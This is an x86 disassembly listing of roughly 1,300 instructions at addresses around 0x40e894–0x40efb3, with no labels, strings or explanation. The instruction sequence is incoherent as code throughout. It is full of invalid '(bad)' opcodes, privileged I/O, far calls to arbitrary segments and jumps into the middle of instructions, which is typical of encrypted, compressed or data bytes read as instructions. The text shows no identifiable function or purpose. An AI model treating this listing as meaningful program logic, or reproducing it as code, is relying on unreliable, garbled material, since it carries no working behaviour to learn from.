  40e894:	add    al,0x72
  40e896:	jbe    0x40e8ae
  40e898:	push   edx
  40e899:	or     cl,0x50
  40e89c:	mov    al,ds:0xc53f232e
  40e8a1:	(bad)  
  40e8a2:	in     al,0xe0
  40e8a4:	shl    BYTE PTR [eax],0x25
  40e8a7:	neg    DWORD PTR [edi]
  40e8a9:	retf   0x26f8
  40e8ac:	lds    edx,FWORD PTR [esi+0x40]
  40e8af:	aad    0x55
  40e8b1:	(bad)  ds:0xf073bdc5
  40e8b7:	cdq    
  40e8b8:	sbb    al,0xec
  40e8ba:	jns    0x40e83d
  40e8bc:	ds (bad) 
  40e8be:	popf   
  40e8bf:	dec    edi
  40e8c0:	cli    
  40e8c1:	ins    BYTE PTR es:[edi],dx
  40e8c2:	jmp    0x883cc44e
  40e8c7:	daa    
  40e8c8:	(bad)  
  40e8c9:	loopne 0x40e8ff
  40e8cb:	xchg   esp,eax
  40e8cc:	and    DWORD PTR [edi],eax
  40e8ce:	cwde   
  40e8cf:	mov    eax,DWORD PTR [ecx-0x6f80fbe1]
  40e8d5:	lods   eax,DWORD PTR ds:[esi]
  40e8d6:	cdq    
  40e8d7:	inc    edx
  40e8d8:	push   esi
  40e8d9:	scas   al,BYTE PTR es:[edi]
  40e8da:	pop    esp
  40e8db:	les    ebx,FWORD PTR [edi+0x39a7abdf]
  40e8e1:	xchg   edi,eax
  40e8e2:	mov    al,0xaf
  40e8e4:	(bad)  
  40e8e5:	(bad)  
  40e8e6:	or     DWORD PTR [eax+ecx*4+0x36],ebp
  40e8ea:	shl    esi,0xa7
  40e8ed:	xchg   ecx,eax
  40e8ee:	cmp    DWORD PTR ds:0xd24dd77c,esp
  40e8f4:	ds add al,0x19
  40e8f7:	lods   al,BYTE PTR ds:[esi]
  40e8f8:	xor    ebx,edi
  40e8fa:	fnstsw WORD PTR [ecx-0x56e36ce1]
  40e900:	and    BYTE PTR [esi],bl
  40e902:	sar    DWORD PTR [ebp+0x14f7ceb6],1
  40e908:	dec    ecx
  40e909:	fistp  QWORD PTR [esi]
  40e90b:	lods   al,BYTE PTR ds:[esi]
  40e90c:	jmp    0x40e98b
  40e90e:	inc    edx
  40e90f:	inc    eax
  40e910:	add    eax,0xec37d855
  40e915:	addr16 and eax,ecx
  40e918:	mov    WORD PTR [edi],ss
  40e91a:	sub    al,0x5b
  40e91c:	fwait
  40e91d:	loope  0x40e8c9
  40e91f:	push   ecx
  40e920:	inc    esi
  40e921:	cmc    
  40e922:	add    BYTE PTR [eax-0x27f6bbb],0x66
  40e929:	sub    BYTE PTR [ecx-0x24],ah
  40e92c:	hlt    
  40e92d:	inc    DWORD PTR [ebp-0x51]
  40e930:	or     al,0xb9
  40e932:	jecxz  0x40e922
  40e934:	mov    dl,0x16
  40e936:	test   eax,ecx
  40e938:	jae    0x40e946
  40e93a:	icebp  
  40e93b:	mov    esi,0xfe4aaef9
  40e940:	mov    WORD PTR [edx-0x19ff43b8],?
  40e946:	enter  0x6d0a,0x79
  40e94a:	mov    cl,BYTE PTR [ebx+0x1d261a6c]
  40e950:	push   edx
  40e951:	call   0xcaa3:0x7e8c4bcb
  40e958:	or     BYTE PTR [edx-0x7d],0x74
  40e95c:	popf   
  40e95d:	pushf  
  40e95e:	aas    
  40e95f:	push   esp
  40e960:	cdq    
  40e961:	xchg   ecx,eax
  40e962:	inc    esp
  40e963:	mov    al,0x29
  40e965:	jns    0x40e8f9
  40e967:	mov    al,ds:0x71831826
  40e96c:	(bad)  
  40e96e:	xchg   esp,eax
  40e96f:	mov    bl,0xe
  40e971:	push   cs
  40e972:	(bad)  
  40e973:	aam    0xc
  40e975:	ins    DWORD PTR es:[edi],dx
  40e976:	xchg   bl,al
  40e978:	push   esi
  40e979:	and    eax,0x8f2c5442
  40e97e:	sub    al,0x61
  40e980:	jmp    0x40e957
  40e982:	inc    edi
  40e983:	icebp  
  40e984:	inc    ebp
  40e985:	aaa    
  40e986:	lea    edi,[edx+0x63]
  40e989:	mov    esp,0x5ed238db
  40e98e:	inc    eax
  40e98f:	inc    ebp
  40e990:	pop    edi
  40e991:	xchg   edx,eax
  40e992:	les    ecx,FWORD PTR [esi]
  40e994:	in     al,dx
  40e995:	pushf  
  40e996:	or     ebx,DWORD PTR [eax+0x49]
  40e999:	cmp    al,0xe3
  40e99b:	xor    al,BYTE PTR [ebx-0x7a1c22e6]
  40e9a1:	sub    dh,BYTE PTR [eax+0x7d]
  40e9a4:	push   DWORD PTR [ebx]
  40e9a6:	iret   
  40e9a7:	or     BYTE PTR [eax],al
  40e9a9:	jno    0x40e994
  40e9ab:	xor    bl,dl
  40e9ad:	(bad)  
  40e9ae:	fidivr WORD PTR [esi+0x6e]
  40e9b1:	push   ecx
  40e9b2:	mov    bh,0xd7
  40e9b4:	rcl    ebp,cl
  40e9b6:	cli    
  40e9b7:	retf   
  40e9b8:	mov    bh,0x18
  40e9ba:	and    eax,0xa747f2e9
  40e9bf:	fs pop eax
  40e9c1:	mov    ebx,0x3be9271c
  40e9c6:	xchg   BYTE PTR [edx+0x48180745],bh
  40e9cc:	stc    
  40e9cd:	das    
  40e9ce:	arpl   dx,cx
  40e9d0:	loop   0x40e9df
  40e9d2:	cwde   
  40e9d3:	addr16 cmp eax,edx
  40e9d6:	stos   BYTE PTR es:[edi],al
  40e9d7:	iret   
  40e9d8:	div    DWORD PTR [eax+0x14]
  40e9db:	enter  0x5ee7,0xe6
  40e9df:	xchg   ebp,eax
  40e9e0:	jl     0x40e98e
  40e9e2:	into   
  40e9e3:	stc    
  40e9e4:	retf   0xdb5a
  40e9e7:	test   BYTE PTR [esi],0x9f
  40e9ea:	mov    ecx,0x20b07c32
  40e9ef:	pop    edi
  40e9f0:	loopne 0x40e9b2
  40e9f2:	and    al,0xdd
  40e9f4:	inc    esi
  40e9f5:	and    bh,dl
  40e9f7:	dec    ebp
  40e9f8:	or     al,0x39
  40e9fa:	ror    BYTE PTR ds:0x5860843d,cl
  40ea00:	stos   BYTE PTR es:[edi],al
  40ea01:	cmp    DWORD PTR [edi],esi
  40ea03:	xor    eax,0x9142183c
  40ea08:	ret    
  40ea09:	outs   dx,DWORD PTR ds:[esi]
  40ea0a:	pop    ss
  40ea0b:	inc    esi
  40ea0c:	outs   dx,DWORD PTR ds:[esi]
  40ea0d:	dec    ebx
  40ea0e:	mov    esp,0x4d67cded
  40ea13:	xor    BYTE PTR [edx-0x5f],bl
  40ea16:	stos   BYTE PTR es:[edi],al
  40ea17:	jg     0x40ea25
  40ea19:	lock push eax
  40ea1b:	cmp    BYTE PTR [eax],dh
  40ea1d:	test   esi,0x4ef0f6e6
  40ea23:	and    eax,0x6d1de94a
  40ea28:	in     eax,dx
  40ea29:	mov    cl,0x71
  40ea2b:	jmp    0x4e8f:0x1e200b03
  40ea32:	pop    ecx
  40ea33:	mov    es,eax
  40ea35:	sub    al,0x54
  40ea37:	lahf   
  40ea38:	sub    DWORD PTR [eax-0x1d],0xea6f9438
  40ea3f:	ds and eax,0xa60f5c24
  40ea45:	fcomp  QWORD PTR [eax+esi*2-0x7b4d1a70]
  40ea4c:	std    
  40ea4d:	pop    esp
  40ea4e:	dec    esi
  40ea4f:	rcr    BYTE PTR [eax],0x81
  40ea52:	adc    ebp,DWORD PTR [esi+0x786a7e1b]
  40ea58:	sbb    ah,BYTE PTR [esi-0x5a552b6d]
  40ea5e:	mov    cl,0xa6
  40ea60:	or     ah,cl
  40ea62:	or     ah,dh
  40ea64:	jb     0x40ead3
  40ea66:	retf   
  40ea67:	dec    eax
  40ea68:	mov    ds:0x7882e320,al
  40ea6d:	js     0x40ea72
  40ea6f:	std    
  40ea70:	dec    ecx
  40ea71:	push   edi
  40ea72:	adc    dl,ah
  40ea74:	aas    
  40ea75:	shl    DWORD PTR [eax+edx*2+0x7b48b8af],0x62
  40ea7d:	repnz fisubr DWORD PTR [edx-0x236f2c48]
  40ea84:	and    DWORD PTR [ebp-0x4b62c64],esp
  40ea8a:	popa   
  40ea8b:	dec    ecx
  40ea8c:	pop    ecx
  40ea8d:	call   0x62179815
  40ea92:	mov    gs,edi
  40ea94:	jae    0x40ea34
  40ea96:	or     BYTE PTR [edi+eax*4-0x25],dl
  40ea9a:	mov    WORD PTR [ebx+0x2fb6aad2],?
  40eaa0:	ret    0xfc1f
  40eaa3:	xor    eax,0xa8f2cf3f
  40eaa8:	pop    eax
  40eaa9:	adc    ah,BYTE PTR [esi]
  40eaab:	test   al,0xe6
  40eaad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaae:	push   0x5e
  40eab0:	push   ecx
  40eab1:	or     esp,DWORD PTR [esi+ebx*4-0x6]
  40eab5:	iret   
  40eab6:	ss retf 
  40eab8:	je     0x40ea51
  40eaba:	pop    ecx
  40eabb:	sbb    al,0x50
  40eabd:	(bad)  
  40eabe:	fidiv  WORD PTR ds:0x1c612de1
  40eac4:	leave  
  40eac5:	pop    ds
  40eac6:	pushf  
  40eac7:	mov    es,WORD PTR [ebx+0x7f]
  40eaca:	enter  0xef2,0x34
  40eace:	shl    DWORD PTR [ebx],cl
  40ead0:	sub    dh,BYTE PTR [edi-0x51]
  40ead3:	pop    ebx
  40ead4:	ret    
  40ead5:	icebp  
  40ead6:	mov    dh,0x5c
  40ead8:	pop    ecx
  40ead9:	jno    0x40eb27
  40eadb:	pushf  
  40eadc:	cdq    
  40eadd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eadf:	cmp    al,0x4d
  40eae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae2:	dec    eax
  40eae3:	rol    DWORD PTR [eax],0x43
  40eae6:	vminss xmm2,xmm3,xmm3
  40eaea:	and    edx,DWORD PTR [ebx+0x6e26f654]
  40eaf0:	mov    ds:0x8f2b452b,eax
  40eaf5:	out    0xd3,eax
  40eaf7:	pop    ebx
  40eaf8:	icebp  
  40eaf9:	push   ebx
  40eafa:	loopne 0x40ea7c
  40eafc:	mov    cl,bl
  40eafe:	cmp    al,0xf7
  40eb00:	outs   dx,BYTE PTR ds:[esi]
  40eb01:	or     ah,ah
  40eb03:	sti    
  40eb04:	xlat   BYTE PTR ds:[ebx]
  40eb05:	sbb    esp,ecx
  40eb07:	sub    dh,BYTE PTR [esi]
  40eb09:	aad    0x30
  40eb0b:	stos   BYTE PTR es:[edi],al
  40eb0c:	(bad)  
  40eb0d:	xchg   edi,eax
  40eb0e:	pop    ebp
  40eb0f:	nop
  40eb10:	xchg   ebx,eax
  40eb11:	xlat   BYTE PTR ds:[ebx]
  40eb12:	fist   WORD PTR [ebp-0x6d365864]
  40eb18:	retf   
  40eb19:	inc    BYTE PTR ds:0xd33a1ae2
  40eb1f:	sbb    BYTE PTR [edi],al
  40eb21:	les    ebx,FWORD PTR [ecx+0x266063bf]
  40eb27:	out    0x6c,al
  40eb29:	add    eax,0x73379110
  40eb2e:	push   ecx
  40eb2f:	mov    esi,0xc6563c40
  40eb34:	leave  
  40eb35:	jne    0x40eb34
  40eb37:	mov    WORD PTR [ebx+0x3],?
  40eb3a:	js     0x40eb5c
  40eb3c:	xchg   edi,eax
  40eb3d:	cmp    BYTE PTR ds:0x56e91066,cl
  40eb43:	lods   eax,DWORD PTR ds:[esi]
  40eb44:	shl    BYTE PTR [esi-0x58291857],cl
  40eb4a:	push   ebp
  40eb4b:	dec    esp
  40eb4c:	jo     0x40eaf5
  40eb4e:	xor    ebx,ebp
  40eb50:	fcmovne st,st(6)
  40eb52:	xor    eax,0x3b0a49ef
  40eb57:	mov    eax,cs:0xb5532a1b
  40eb5d:	scas   al,BYTE PTR es:[edi]
  40eb5e:	add    BYTE PTR [edx+0x79],bl
  40eb61:	pop    ss
  40eb62:	(bad)  
  40eb63:	sub    esp,DWORD PTR [esi+esi*4-0x6a3c4db8]
  40eb6a:	and    eax,0xe46b4541
  40eb6f:	push   edi
  40eb70:	pop    es
  40eb71:	xor    ecx,DWORD PTR [eax-0x57]
  40eb74:	fisttp QWORD PTR [esp+ebx*1-0x52]
  40eb78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb79:	jne    0x40eb02
  40eb7b:	xchg   DWORD PTR [esi],esp
  40eb7d:	push   cs
  40eb7e:	test   al,0xc6
  40eb80:	push   cs
  40eb81:	adc    dh,cl
  40eb83:	inc    ebp
  40eb84:	dec    ebx
  40eb85:	pop    ecx
  40eb86:	iret   
  40eb87:	and    dl,BYTE PTR [edi+0x21]
  40eb8a:	sbb    dl,BYTE PTR [ebp-0x378c0b5e]
  40eb90:	pop    ebp
  40eb91:	int    0x19
  40eb93:	xchg   esi,eax
  40eb94:	and    al,BYTE PTR [eax-0x3863a5cd]
  40eb9a:	mov    bh,0x8b
  40eb9c:	js     0x40ebd7
  40eb9e:	out    0xdd,eax
  40eba0:	popf   
  40eba1:	mov    BYTE PTR [esi+0x6a4a3ac6],bh
  40eba7:	inc    esi
  40eba8:	cmp    bh,BYTE PTR [eax+esi*2]
  40ebab:	fist   WORD PTR [ebp+0x30]
  40ebae:	dec    esp
  40ebaf:	mov    esi,ecx
  40ebb1:	jb     0x40eb8b
  40ebb3:	enter  0xfbc9,0xbc
  40ebb7:	push   ebp
  40ebb8:	ror    al,1
  40ebba:	cwde   
  40ebbb:	mov    ch,0x7f
  40ebbd:	push   ss
  40ebbe:	call   0x1041eeb8
  40ebc3:	push   edi
  40ebc4:	in     eax,0x7e
  40ebc6:	pop    edx
  40ebc7:	inc    ebp
  40ebc8:	mov    dh,dl
  40ebca:	int3   
  40ebcb:	inc    esp
  40ebcc:	dec    eax
  40ebcd:	or     eax,0x5fc123b4
  40ebd2:	out    dx,eax
  40ebd3:	inc    edi
  40ebd4:	xor    BYTE PTR [ebx],0x29
  40ebd7:	sbb    al,0xc0
  40ebd9:	adc    al,dl
  40ebdb:	inc    ecx
  40ebdc:	pushf  
  40ebdd:	inc    ecx
  40ebde:	dec    ecx
  40ebdf:	gs pop eax
  40ebe1:	push   edx
  40ebe2:	cmp    esp,edi
  40ebe4:	into   
  40ebe5:	xor    edi,esi
  40ebe7:	daa    
  40ebe8:	pop    edx
  40ebe9:	add    BYTE PTR [eax+0x7ddd99bb],cl
  40ebef:	(bad)  
  40ebf1:	pop    DWORD PTR ds:0x72034486
  40ebf7:	mov    ecx,0x73826e91
  40ebfc:	aam    0xb2
  40ebfe:	ror    DWORD PTR [eax+0x74],cl
  40ec01:	out    0x59,eax
  40ec03:	gs stc 
  40ec05:	std    
  40ec06:	push   esi
  40ec07:	xchg   edi,eax
  40ec08:	add    BYTE PTR [edx+edx*1],ch
  40ec0b:	xchg   edi,eax
  40ec0c:	mov    ch,0x8d
  40ec0e:	nop
  40ec0f:	jmp    0xbad23119
  40ec14:	es jbe 0x40eb9c
  40ec17:	jno    0x40ebbb
  40ec19:	xchg   ecx,eax
  40ec1a:	repz mov ebp,0x8a7d69df
  40ec20:	xor    al,0x1c
  40ec22:	stos   DWORD PTR es:[edi],eax
  40ec23:	repz mov ecx,0x20ecaee5
  40ec29:	cmp    DWORD PTR [eax-0x6],eax
  40ec2c:	mov    edi,0x5d1850cc
  40ec31:	mov    cl,0x74
  40ec33:	xchg   ecx,eax
  40ec34:	mov    dh,0x7d
  40ec36:	push   esp
  40ec37:	sbb    BYTE PTR ds:0x58d72b92,ah
  40ec3d:	adc    eax,0x50223edf
  40ec42:	and    eax,0xc6a634eb
  40ec47:	xchg   BYTE PTR [edx],al
  40ec49:	xlat   BYTE PTR ds:[ebx]
  40ec4a:	aad    0xff
  40ec4c:	jne    0x40ec6b
  40ec4e:	inc    esp
  40ec4f:	fbld   TBYTE PTR [ebx-0x50]
  40ec52:	or     ch,BYTE PTR [edx-0x1d]
  40ec55:	add    BYTE PTR [esi-0x55],cl
  40ec58:	sti    
  40ec59:	push   0x40
  40ec5b:	add    edi,edi
  40ec5d:	pusha  
  40ec5e:	pop    ds
  40ec5f:	ret    
  40ec60:	adc    DWORD PTR [edx-0x27b1fb0d],0x98c4194d
  40ec6a:	push   edx
  40ec6b:	imul   esi,DWORD PTR [ebx],0xffffffc9
  40ec6e:	clc    
  40ec6f:	imul   ecx,ebp,0x68ec774
  40ec75:	mov    edx,0x6e2498d8
  40ec7a:	add    al,0x72
  40ec7c:	test   BYTE PTR [esi],0x8c
  40ec7f:	(bad)  
  40ec80:	je     0x40ec5a
  40ec82:	and    ch,0x60
  40ec85:	ins    BYTE PTR es:[edi],dx
  40ec86:	xchg   DWORD PTR [ebp+0x452c0fab],esi
  40ec8c:	imul   esi,DWORD PTR [ebp-0x548ca08c],0xf6262062
  40ec96:	inc    esi
  40ec97:	push   cs
  40ec98:	sti    
  40ec99:	xor    al,0xca
  40ec9b:	leave  
  40ec9c:	mov    al,ds:0x21365736
  40eca1:	add    eax,0x246fd417
  40eca6:	push   ebp
  40eca7:	xchg   DWORD PTR [ebx+0x2be0eb52],esp
  40ecad:	cmp    dh,cl
  40ecaf:	mov    ds:0x24b2e863,al
  40ecb4:	retf   0xaef1
  40ecb7:	cli    
  40ecb8:	rcr    dl,0xf0
  40ecbb:	enter  0xf8ba,0x7b
  40ecbf:	and    cl,dh
  40ecc1:	and    al,0xfb
  40ecc3:	pop    DWORD PTR [eax+ebp*4]
  40ecc6:	pusha  
  40ecc7:	xchg   DWORD PTR [esi],esi
  40ecc9:	and    DWORD PTR [ecx],ebx
  40eccb:	stos   BYTE PTR es:[edi],al
  40eccc:	outs   dx,BYTE PTR ds:[esi]
  40eccd:	mov    bh,0x4b
  40eccf:	pop    ebp
  40ecd0:	cli    
  40ecd1:	push   eax
  40ecd2:	pop    esp
  40ecd3:	and    DWORD PTR [ecx],ecx
  40ecd5:	xchg   edi,eax
  40ecd6:	mov    bl,ch
  40ecd8:	mov    DWORD PTR [eax-0x54d1d03],0xec8893e3
  40ece2:	outs   dx,DWORD PTR ds:[esi]
  40ece3:	aaa    
  40ece4:	sti    
  40ece5:	sub    ebp,DWORD PTR [edx+0x530976fb]
  40eceb:	xchg   ebx,eax
  40ecec:	lods   al,BYTE PTR ds:[esi]
  40eced:	stos   BYTE PTR es:[edi],al
  40ecee:	in     al,dx
  40ecef:	lods   eax,DWORD PTR ds:[esi]
  40ecf0:	cli    
  40ecf1:	das    
  40ecf2:	pusha  
  40ecf3:	xchg   esi,eax
  40ecf4:	jmp    0x40ed5b
  40ecf6:	loop   0x40ed2f
  40ecf8:	call   0x57409641
  40ecfd:	int3   
  40ecfe:	xor    al,0xa6
  40ed00:	and    DWORD PTR [ebp+0x1ab14d83],ecx
  40ed06:	pusha  
  40ed07:	out    dx,al
  40ed08:	add    al,0xe0
  40ed0a:	adc    BYTE PTR [ecx-0x43],0x22
  40ed0e:	jl     0x40ecf0
  40ed10:	mov    ecx,0xd091dfcf
  40ed15:	mov    fs,WORD PTR [eax-0x57e89816]
  40ed1b:	test   dl,bh
  40ed1d:	(bad)  
  40ed1f:	add    edx,DWORD PTR ds:[esi]
  40ed22:	mov    ss:0x2619c364,eax
  40ed28:	sub    edx,DWORD PTR [ecx]
  40ed2a:	mov    WORD PTR [edi+0x3f],es
  40ed2d:	jb     0x40ecb0
  40ed2f:	(bad)
  40ed32:	fs dec esp
  40ed34:	pushf  
  40ed35:	and    al,0x9c
  40ed37:	mov    bl,0xfd
  40ed39:	dec    eax
  40ed3a:	mov    al,0x94
  40ed3c:	jbe    0x40ed46
  40ed3e:	(bad)  
  40ed3f:	push   edx
  40ed40:	pop    eax
  40ed41:	or     ch,BYTE PTR [esp+eax*8+0x6b]
  40ed45:	loope  0x40ed00
  40ed47:	test   al,0x1d
  40ed49:	cmp    DWORD PTR [edi],edi
  40ed4b:	repnz outs dx,BYTE PTR ss:[esi]
  40ed4e:	cli    
  40ed4f:	push   eax
  40ed50:	cli    
  40ed51:	iret   
  40ed52:	ret    0x7f79
  40ed55:	jge    0x40ecf6
  40ed57:	pop    es
  40ed58:	nop
  40ed59:	xor    ebx,DWORD PTR [ebx+eiz*8+0x6b]
  40ed5d:	fs and al,0xaf
  40ed60:	in     al,dx
  40ed61:	(bad)  [esi+ebp*2]
  40ed64:	xor    esp,eax
  40ed66:	inc    ecx
  40ed67:	pop    ecx
  40ed68:	xchg   esi,eax
  40ed69:	jbe    0x40ede0
  40ed6b:	sbb    ah,BYTE PTR [ecx]
  40ed6d:	mov    WORD PTR [edx],gs
  40ed6f:	pop    ds
  40ed70:	adc    esi,DWORD PTR [esi]
  40ed72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed73:	idiv   BYTE PTR [ebx-0x3]
  40ed76:	gs pop ebp
  40ed78:	inc    ebp
  40ed79:	scas   al,BYTE PTR es:[edi]
  40ed7a:	add    al,0xe3
  40ed7c:	mov    ebx,0xf6cc3416
  40ed81:	retf   0xbafc
  40ed84:	cmp    eax,0x2b1f9ad3
  40ed89:	popf   
  40ed8a:	ror    DWORD PTR [esi],0xe7
  40ed8d:	mov    esp,0xbe859ada
  40ed92:	dec    esp
  40ed93:	retf   0xbbc6
  40ed96:	test   BYTE PTR [eax-0x61],dl
  40ed99:	lock mov esi,0x6c3467e
  40ed9f:	icebp  
  40eda0:	inc    edi
  40eda1:	pusha  
  40eda2:	xchg   edx,eax
  40eda4:	xchg   ebx,eax
  40eda5:	push   esp
  40eda6:	loope  0x40edca
  40eda8:	mov    cl,BYTE PTR es:[esi+0x14]
  40edac:	or     eax,0x409bb50e
  40edb1:	sbb    ebx,DWORD PTR [edi-0xc93960d]
  40edb7:	cli    
  40edb8:	popa   
  40edb9:	mov    WORD PTR [ebx],ds
  40edbb:	or     DWORD PTR [esi-0x8fae179],edx
  40edc1:	jl     0x40ee31
  40edc3:	mov    ecx,0x3b4d63c
  40edc8:	jne    0x40ed7c
  40edca:	pusha  
  40edcb:	xlat   BYTE PTR ds:[ebx]
  40edcc:	cmp    BYTE PTR [edi+0x19],bh
  40edcf:	sbb    eax,0x22758226
  40edd4:	cmp    DWORD PTR [ecx+0x26],ebx
  40edd7:	outs   dx,BYTE PTR ds:[esi]
  40edd8:	jp     0x40eddd
  40edda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eddb:	mov    ds:0x9f1c4130,eax
  40ede0:	mov    ecx,0x25bb5736
  40ede5:	adc    bh,BYTE PTR [edi]
  40ede7:	cmp    bh,dl
  40ede9:	imul   esp,DWORD PTR [ecx-0x7638ad87],0xffffffe5
  40edf0:	adc    cl,BYTE PTR [esi]
  40edf2:	push   ds
  40edf3:	in     al,dx
  40edf4:	mov    ebx,DWORD PTR [edi+eiz*2+0x4c12ec10]
  40edfb:	aas    
  40edfc:	jmp    0x40ee3d
  40edfe:	test   eax,0x18169f80
  40ee03:	cmp    eax,DWORD PTR [esi+ebp*2+0x579f5263]
  40ee0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee0b:	in     al,dx
  40ee0c:	repz pusha 
  40ee0e:	lods   eax,DWORD PTR ds:[esi]
  40ee0f:	jecxz  0x40edc8
  40ee11:	inc    edi
  40ee12:	xor    ecx,ebp
  40ee14:	jnp    0x40ede3
  40ee16:	rol    BYTE PTR cs:0xf7db3be1,cl
  40ee1d:	add    dl,bh
  40ee1f:	iret   
  40ee20:	loop   0x40ee16
  40ee22:	push   ds
  40ee23:	ret    
  40ee24:	pop    ds
  40ee25:	or     DWORD PTR [edi-0xd586327],esi
  40ee2b:	mov    ds:0xf8b1b3e7,al
  40ee30:	inc    edi
  40ee31:	ss xor esi,0x36
  40ee35:	imul   ebp,DWORD PTR [esi+eax*1+0x52],0xffffffeb
  40ee3a:	pop    edx
  40ee3b:	cdq    
  40ee3c:	aas    
  40ee3d:	dec    ecx
  40ee3e:	sbb    al,0x69
  40ee40:	xchg   esp,eax
  40ee41:	clc    
  40ee42:	xor    DWORD PTR [ecx+ebx*8],ecx
  40ee45:	icebp  
  40ee46:	(bad)  
  40ee47:	jmp    0x40ee27
  40ee49:	cmp    eax,0xad5ef6e7
  40ee4e:	out    0x29,al
  40ee50:	cmp    dh,dl
  40ee52:	sub    al,0x28
  40ee54:	jo     0x40edf5
  40ee56:	ror    dh,1
  40ee58:	push   ebp
  40ee59:	mov    BYTE PTR [edi],bh
  40ee5b:	test   al,0xce
  40ee5d:	mov    ah,BYTE PTR [ecx]
  40ee5f:	xor    BYTE PTR [eax+0xd6a8bdb],cl
  40ee65:	sub    dh,dh
  40ee67:	jno    0x40edf9
  40ee69:	push   es
  40ee6a:	lds    esi,FWORD PTR [edi+0x4adc7d53]
  40ee70:	jae    0x40eecf
  40ee72:	stc    
  40ee73:	xchg   ebx,eax
  40ee74:	lods   al,BYTE PTR ds:[esi]
  40ee75:	fwait
  40ee76:	imul   ebp,DWORD PTR ds:0x3e26b98d,0xffffffc7
  40ee7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee7e:	dec    ebx
  40ee7f:	pop    esi
  40ee80:	mov    esi,0x23418fa6
  40ee85:	pop    ss
  40ee86:	and    al,0xf5
  40ee88:	push   0xc828558a
  40ee8d:	dec    edi
  40ee8e:	jns    0x40ee28
  40ee90:	pop    edi
  40ee91:	xchg   DWORD PTR [esi],edx
  40ee93:	mov    WORD PTR ss:[eax-0x7d],ds
  40ee97:	sub    BYTE PTR [ecx],0xf3
  40ee9a:	push   cs
  40ee9b:	out    0x9f,eax
  40ee9d:	xlat   BYTE PTR ds:[ebx]
  40ee9e:	xchg   ecx,esp
  40eea0:	mov    BYTE PTR [esi],0x6a
  40eea3:	jmp    0x40eec7
  40eea5:	std    
  40eea6:	cmc    
  40eea7:	scas   al,BYTE PTR es:[edi]
  40eea8:	mov    edx,esp
  40eeaa:	not    BYTE PTR [ebx-0xb]
  40eead:	stos   BYTE PTR es:[edi],al
  40eeae:	cmc    
  40eeaf:	inc    esp
  40eeb0:	add    eax,0x2e7a7194
  40eeb5:	popf   
  40eeb6:	repz cs cmp al,0xae
  40eeba:	aam    0xd9
  40eebc:	adc    DWORD PTR [ebx],esi
  40eebe:	clc    
  40eebf:	(bad)  
  40eec0:	pushf  
  40eec1:	mov    ds:0x9553d6f2,eax
  40eec6:	int3   
  40eec7:	xor    ebx,DWORD PTR ds:0x9470eba1
  40eecd:	lods   eax,DWORD PTR ds:[esi]
  40eece:	sahf   
  40eecf:	arpl   bp,sp
  40eed1:	xor    al,0x8a
  40eed3:	sub    esp,DWORD PTR [ecx-0x80]
  40eed6:	push   0xf79c37b0
  40eedb:	xor    BYTE PTR [ebx],dh
  40eedd:	mov    bl,0x94
  40eedf:	das    
  40eee0:	ins    BYTE PTR es:[edi],dx
  40eee1:	pop    ecx
  40eee2:	xor    DWORD PTR [eax+eiz*4+0x4a7a2bbb],esi
  40eee9:	jg     0x40ef41
  40eeeb:	adc    bl,dh
  40eeed:	ret    0x992f
  40eef0:	fild   DWORD PTR [edi]
  40eef2:	cdq    
  40eef3:	into   
  40eef4:	imul   dl
  40eef6:	mov    edx,0x4386b143
  40eefb:	call   0x23b60c49
  40ef00:	shl    BYTE PTR es:[esi-0x478e5ea1],0xab
  40ef08:	xrelease mov BYTE PTR [ecx-0x7aa820bd],ah
  40ef0f:	mov    ecx,DWORD PTR [ecx-0x74]
  40ef12:	dec    eax
  40ef13:	ret    0xb67c
  40ef16:	je     0x40ef52
  40ef18:	scas   eax,DWORD PTR es:[edi]
  40ef19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef1a:	and    al,0x72
  40ef1c:	jecxz  0x40ef8f
  40ef1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef1f:	repnz mov ebx,DWORD PTR [edx+0x73bd49a5]
  40ef26:	pop    ebx
  40ef27:	sbb    al,0xe5
  40ef29:	push   cs
  40ef2a:	mov    al,0xe8
  40ef2c:	sbb    cl,dl
  40ef2e:	jge    0x40ef0e
  40ef30:	ss xor eax,0x170fd75a
  40ef36:	adc    eax,DWORD PTR [eax]
  40ef38:	and    dh,dh
  40ef3a:	jmp    0x78ed088c
  40ef3f:	(bad)  
  40ef40:	loop   0x40ef14
  40ef42:	js     0x40efb6
  40ef44:	dec    ecx
  40ef45:	mov    ecx,0x8e0dbaad
  40ef4a:	add    eax,0x49503890
  40ef4f:	call   0xbfce:0xe614c9db
  40ef56:	dec    ebp
  40ef57:	hlt    
  40ef58:	adc    cl,ch
  40ef5a:	dec    ecx
  40ef5b:	loop   0x40eedf
  40ef5d:	xchg   bh,ah
  40ef5f:	inc    esi
  40ef60:	les    ebx,FWORD PTR [edx+esi*4]
  40ef63:	pop    ecx
  40ef64:	cmp    eax,0x52732348
  40ef69:	sbb    al,0xcc
  40ef6b:	call   DWORD PTR [eax-0x2ed455f7]
  40ef71:	(bad)  
  40ef72:	cmp    eax,0xaf039f63
  40ef77:	test   dl,bl
  40ef79:	imul   ecx,DWORD PTR [edi-0x74],0x95bc086b
  40ef80:	add    DWORD PTR [edi-0x1b],ecx
  40ef83:	cwde   
  40ef84:	adc    DWORD PTR [ebx-0x1c66e3e2],edi
  40ef8a:	mov    esi,0xbc9e831f
  40ef8f:	dec    ebx
  40ef90:	(bad)  
  40ef91:	push   eax
  40ef92:	jle    0x40ef74
  40ef94:	pop    eax
  40ef95:	cwde   
  40ef96:	mov    ah,0xd3
  40ef98:	fcom   QWORD PTR ds:0x49f7b42b
  40ef9e:	retf   0xf2fc
  40efa1:	clc    
  40efa2:	je     0x40f00b
  40efa4:	dec    edx
  40efa5:	add    BYTE PTR [ebp-0x4d735bd],bl
  40efab:	mov    ds:0xc4df53cd,al
  40efb0:	mov    ah,0xe0
  40efb2:	(bad)  
  40efb3:	ds mov dh,0x17
